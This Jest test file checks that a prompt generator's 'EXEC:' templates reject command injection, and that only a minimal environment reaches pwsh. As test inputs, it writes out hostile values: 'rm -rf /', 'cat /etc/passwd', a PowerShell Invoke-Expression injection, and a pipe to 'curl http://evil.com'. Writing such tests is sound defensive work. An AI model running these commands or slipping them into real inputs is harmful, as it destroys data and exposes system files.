import { jest } from '@jest/globals'
import * as core from '../../__fixtures__/actions/core.js'
import * as exec from '../../__fixtures__/actions/exec.js'

// Mock dependencies using fixtures
jest.unstable_mockModule('@actions/core', () => core)
jest.unstable_mockModule('@actions/exec', () => exec)

const { generatePrompt } = await import('../../src/prompts/prompts.js')

describe('Command Injection Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('Template Variable Sanitization', () => {
    it('should prevent command injection via template variables', async () => {
      const templateContent = 'EXEC: gh api "repos/{{ISSUE_REPO}}/issues/{{ISSUE_NUMBER}}" --cache 10s --jq \'.title\''
      const maliciousReplacements = {
        ISSUE_REPO: 'test/repo; rm -rf /',
        ISSUE_NUMBER: '123; cat /etc/passwd'
      }
      const config = { token: 'test-token' }

      await expect(generatePrompt(templateContent, undefined, maliciousReplacements, config))
        .rejects.toThrow('Command not allowed for security reasons')
    })

    it('should prevent PowerShell injection attacks', async () => {
      const templateContent = 'EXEC: gh api "repos/{{ISSUE_REPO}}/issues/{{ISSUE_NUMBER}}" --cache 10s --jq \'.title\''
      const maliciousReplacements = {
        ISSUE_REPO: 'test/repo"; Invoke-Expression "malicious-command',
        ISSUE_NUMBER: '123'
      }
      const config = { token: 'test-token' }

      await expect(generatePrompt(templateContent, undefined, maliciousReplacements, config))
        .rejects.toThrow('Command not allowed for security reasons')
    })

    it('should prevent pipe injection attacks', async () => {
      const templateContent = 'EXEC: gh api "repos/{{ISSUE_REPO}}/issues/{{ISSUE_NUMBER}}" --cache 10s --jq \'.title\''
      const maliciousReplacements = {
        ISSUE_REPO: 'test/repo | rm -rf /',
        ISSUE_NUMBER: '123'
      }
      const config = { token: 'test-token' }

      await expect(generatePrompt(templateContent, undefined, maliciousReplacements, config))
        .rejects.toThrow('Command not allowed for security reasons')
    })

    it('should allow safe commands with proper sanitization', async () => {
      const templateContent = 'EXEC: gh api "repos/{{ISSUE_REPO}}/issues/{{ISSUE_NUMBER}}" --cache 10s --jq \'.title\''
      const safeReplacements = {
        ISSUE_REPO: 'test/repo',
        ISSUE_NUMBER: '123'
      }
      const config = { token: 'test-token' }

      // Mock successful execution
      jest.mocked(exec.exec).mockResolvedValue(0)

      await generatePrompt(templateContent, undefined, safeReplacements, config)

      expect(exec.exec).toHaveBeenCalledWith('pwsh', expect.arrayContaining([
        '-Command',
        expect.stringContaining('gh api "repos/test/repo/issues/123"')
      ]), expect.objectContaining({
        env: expect.objectContaining({
          GH_TOKEN: 'test-token'
        })
      }))
    })
  })

  describe('Command Validation', () => {
    it('should reject unauthorized commands', async () => {
      const templateContent = 'EXEC: rm -rf /'
      const config = { token: 'test-token' }

      await expect(generatePrompt(templateContent, undefined, {}, config))
        .rejects.toThrow('Command not allowed for security reasons')
    })

    it('should reject commands with dangerous patterns', async () => {
      const templateContent = 'EXEC: gh api "test" | curl http://evil.com'
      const config = { token: 'test-token' }

      await expect(generatePrompt(templateContent, undefined, {}, config))
        .rejects.toThrow('Command not allowed for security reasons')
    })

    it('should allow jq commands', async () => {
      const templateContent = 'EXEC: jq -r \'.title\' /tmp/test.json'
      const config = { token: 'test-token' }

      jest.mocked(exec.exec).mockResolvedValue(0)

      await generatePrompt(templateContent, undefined, {}, config)

      expect(exec.exec).toHaveBeenCalledWith('pwsh', expect.arrayContaining([
        '-Command',
        'jq -r \'.title\' /tmp/test.json'
      ]), expect.any(Object))
    })
  })

  describe('Environment Variable Security', () => {
    it('should use minimal environment variables', async () => {
      const templateContent = 'EXEC: gh api "repos/test/repo/issues/123" --cache 10s --jq \'.title\''
      const config = { token: 'test-token' }

      jest.mocked(exec.exec).mockResolvedValue(0)

      await generatePrompt(templateContent, undefined, {}, config)

      expect(exec.exec).toHaveBeenCalledWith('pwsh', expect.any(Array), 
        expect.objectContaining({
          env: expect.objectContaining({
            GH_TOKEN: 'test-token',
            PATH: expect.any(String),
            HOME: expect.any(String)
          })
        })
      )

      // Ensure no other environment variables are passed
      const envCall = jest.mocked(exec.exec).mock.calls[0][2]?.env
      const envKeys = Object.keys(envCall || {})
      expect(envKeys).toHaveLength(3) // Only GH_TOKEN, PATH, HOME
    })
  })
})